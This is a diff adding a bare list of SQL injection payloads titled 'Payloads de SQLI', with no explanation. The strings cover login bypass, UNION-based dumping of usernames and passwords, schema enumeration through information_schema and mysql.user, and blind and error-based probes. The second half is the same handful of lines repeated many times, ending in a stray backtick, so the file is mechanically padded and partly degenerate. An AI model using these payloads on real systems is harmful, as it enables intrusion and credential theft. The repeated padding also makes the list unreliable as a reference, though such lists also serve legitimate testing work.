@@ -1,0 +1,306 @@
+Payloads de SQLI
+
+1' OR '1'='1
+1' OR '1'='1' --
+1' OR '1'='1' /*
+1' AND '1'='1
+1' AND 1=1
+1' AND 1=2 --
+1' OR '1'='1' #
+1' OR 'x'='x
+' OR 'a'='a
+1' UNION SELECT NULL, NULL, NULL --
+1' UNION SELECT NULL, NULL, username, password FROM users --
+1' UNION ALL SELECT 1, @@version --
+1' UNION SELECT table_name, NULL FROM information_schema.tables --
+1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --
+1' AND (SELECT SUBSTRING(@@version,1,1) = '5') --
+1' AND (SELECT ASCII(SUBSTRING(@@version,1,1))) > 53 --
+1' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password = 'password') --
+1' UNION SELECT 1, 'text' UNION SELECT 2, 'more text' --
+1' AND 1=2 UNION ALL SELECT NULL, NULL, NULL --
+1' UNION SELECT NULL, NULL, (SELECT CONCAT(username, ':', password) FROM users) --
+1' AND 1=1 UNION ALL SELECT 1, version(), 3 --
+1' UNION SELECT 1, 'a' || 'b' --
+1' OR '1'='1' AND 1=2 --
+1' OR 1=1 AND 1=2 --
+1' OR 1=1 LIMIT 1; --
+1' AND (SELECT COUNT(*) FROM users) > 0 --
+1' OR (SELECT COUNT(*) FROM users) > 0 --
+1' AND 1=1 UNION SELECT null, null, null --
+1' UNION SELECT 1, 2, 3 UNION SELECT 4, 5, 6 --
+1' AND (SELECT @@version) --
+1' OR 1=1 --
+1' UNION SELECT 1,2,3,4,5 --
+1' UNION SELECT NULL, NULL, NULL, NULL, NULL --
+1' UNION ALL SELECT NULL, user(), NULL --
+1' UNION ALL SELECT NULL, database(), NULL --
+1' UNION ALL SELECT NULL, current_user(), NULL --
+1' UNION SELECT null, null, null FROM information_schema.tables --
+1' UNION SELECT null, null, null FROM information_schema.columns --
+1' UNION SELECT null, null, null FROM mysql.user --
+1' UNION ALL SELECT NULL, NULL, @@hostname --
+1' UNION ALL SELECT NULL, NULL, CONCAT(user(), '@', @@hostname) --
+1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT CONCAT(username, ':', password) FROM users LIMIT 0,1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --
+1' AND (SELECT COUNT(*) FROM information_schema.tables) --
+1' AND (SELECT COUNT(*) FROM information_schema.tables) < 5 --
+1' AND (SELECT COUNT(*) FROM information_schema.tables) > 5 --
+1' AND (SELECT SUBSTRING(@@version,1,1) = '5') --
+1' OR (SELECT SUBSTRING(@@version,1,1) = '5') --
+1' OR (SELECT SUBSTRING(@@version,1,1)) > 5 --
+1' UNION ALL SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users --
+1' UNION SELECT null, null, @@version --
+1' AND (SELECT ASCII(SUBSTRING(@@version,1,1))) > 50 --
+1' AND (SELECT LENGTH((SELECT CONCAT(username, ':', password) FROM users LIMIT 1))) > 50 --
+1' OR (SELECT LENGTH((SELECT CONCAT(username, ':', password) FROM users LIMIT 1))) > 50 --
+1' AND (SELECT LENGTH(user())) > 10 --
+1' UNION SELECT 1, 2, (SELECT @@version) --
+1' OR 1=1; --
+1' UNION SELECT 1, 2, CONCAT(username, ':', password) FROM users --
+1' UNION SELECT 1, 2, 3, 4, 5 --
+1' UNION SELECT 1, 2, 3, version() --
+1' UNION ALL SELECT 1, user(), 3 --
+1' OR (SELECT SUBSTRING(user(),1,1)) = 'a' --
+1' AND (SELECT SUBSTRING(user(),1,1)) = 'a' --
+1' UNION SELECT null, null, null FROM mysql.db --
+1' AND (SELECT SUBSTRING(@@version,1,1) = '5') --
+1' OR (SELECT SUBSTRING(@@version,1,1) = '5') --
+1' UNION SELECT null, null, null FROM mysql.user --
+1' UNION SELECT null, null, null FROM information_schema.tables --
+1' UNION ALL SELECT NULL, user(), NULL --
+1' UNION ALL SELECT NULL, database(), NULL --
+1' UNION SELECT NULL, NULL, @@hostname --
+1' UNION SELECT NULL, NULL, CONCAT(user(), '@', @@hostname) --
+1' AND (SELECT LENGTH(user())) > 10 --
+1' OR (SELECT LENGTH(user())) > 10 --
+1' AND (SELECT LENGTH(user())) < 20 --
+1' OR (SELECT LENGTH(user())) < 20 --
+1' UNION SELECT NULL, NULL, CONCAT(user(), ':', password) FROM users --
+1' UNION SELECT 1, 2, CONCAT(user(), ':', password) FROM users --
+1' AND (SELECT COUNT(*) FROM information_schema.tables) < 5 --
+1' UNION SELECT null, null, GROUP_CONCAT(user()) FROM mysql.user --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(user()) FROM mysql.user --
+1' OR (SELECT GROUP_CONCAT(username, ':', password) FROM users) --
+1' OR (SELECT GROUP_CONCAT(username, ':', password) FROM users LIMIT 1) --
+1' UNION SELECT NULL, NULL, CONCAT(user(), ':', password) FROM users --
+1' UNION SELECT NULL, NULL, user() FROM mysql.user --
+1' UNION SELECT NULL, NULL, database() FROM mysql.db --
+1' UNION ALL SELECT NULL, version(), NULL --
+1' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --
+1' UNION SELECT NULL, NULL, @@hostname FROM mysql.db --
+1' UNION SELECT NULL, NULL, CONCAT(user(), '@', @@hostname) FROM mysql.user --
+1' UNION ALL SELECT NULL, user(), NULL FROM mysql.user --
+1' UNION SELECT NULL, NULL, @@version FROM mysql.user --
+1' AND (SELECT LENGTH(CONCAT(username, ':', password)) FROM users LIMIT 1) > 50 --
+1' UNION SELECT NULL, NULL, SUBSTRING(user(), 1, 1) FROM mysql.user --
+1' UNION SELECT NULL, NULL, SUBSTRING(user(), 1, 1) FROM mysql.user --
+1' UNION SELECT NULL, NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users --
+1' AND (SELECT SUBSTRING(user(), 1, 1) FROM mysql.user LIMIT 1) = 'a' --
+1' AND (SELECT LENGTH(CONCAT(username, ':', password)) FROM users LIMIT 1) > 50 --
+1' UNION SELECT NULL, NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, user(), NULL FROM mysql.user --
+1' AND (SELECT SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1) = 'a' --
+1' OR (SELECT SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1) = 'a' --
+1' UNION SELECT NULL, NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users --
+1' UNION SELECT NULL, NULL, CONCAT(user(), ':', password) FROM mysql.user --
+1' AND (SELECT SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1) = 'a' --
+1' UNION ALL SELECT NULL, CONCAT(username, ':', password), NULL FROM users --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(user()) FROM mysql.user --
+1' UNION SELECT NULL, NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1 --
+1' OR (SELECT SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1) = 'a' --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' AND (SELECT LENGTH(CONCAT(username, ':', password)) FROM users LIMIT 1) > 50 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' OR (SELECT SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1) = 'a' --
+1' UNION SELECT NULL, NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' OR (SELECT LENGTH(CONCAT(username, ':', password)) FROM users LIMIT 1) > 50 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1 --
+1' AND (SELECT LENGTH(CONCAT(username, ':', password)) FROM users LIMIT 1) > 50 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' OR (SELECT LENGTH(CONCAT(username, ':', password)) FROM users LIMIT 1) > 50 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' OR (SELECT SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1) = 'a' --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' AND (SELECT LENGTH(CONCAT(username, ':', password)) FROM users LIMIT 1) > 50 --
+1' OR (SELECT SUBSTRING(CONCAT(username, ':', password), 1, 1) FROM users LIMIT 1) = 'a' --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' OR (SELECT LENGTH(CONCAT(username, ':', password)) FROM users LIMIT 1) > 50 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' OR (SELECT LENGTH(CONCAT(username, ':', password)) FROM users LIMIT 1) > 50 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION ALL SELECT NULL, SUBSTRING(CONCAT(username, ':', password), 1, 1), NULL FROM users LIMIT 1 --
+1' UNION SELECT NULL, NULL, GROUP_CONCAT(CONCAT(username, ':', password)) FROM users LIMIT 1 --
+`1' UNION SELECT NULL, NULL, GROUP_CONCAT(username, ':', password) FROM users LIMIT 1
